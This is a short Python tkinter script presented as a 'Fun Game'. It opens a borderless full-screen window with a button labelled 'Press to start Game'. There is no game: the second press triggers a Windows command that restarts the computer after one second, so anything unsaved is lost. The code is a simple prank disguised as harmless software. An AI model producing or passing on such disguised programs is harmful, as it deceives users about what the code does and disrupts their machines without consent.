import os
from tkinter import *
window=Tk ()
window.configure(bg='lightSkyBlue')
window.geometry('2000x1000')
window.title('Fun Game')
window.overrideredirect(True)
counter=0

def fakeclick():
    global counter
    counter=counter+1
    subline.configure(text='Press it again')
    if counter >= 2:
        subline.configure(text='Nope, Goodbye')
        return os.system('shutdown /r /t 1')

Title=Label(window,text='Press the button below \nto start the game!',bg='lightSkyBlue',font=('arial',80))
Title.place(x=150,y=50)

subline=Label(window,text='',bg='lightSkyBlue',font=('arial',50))
subline.place(x=300,y=500)

name=Label(window,text='Made by Anson',font=('Calibri',40),bg='lightSkyBlue')
name.place(x=500,y=300)

fakebutton=Button(window,text='Press to start Game',command=fakeclick)
fakebutton.place(x=600,y=800)

window.mainloop()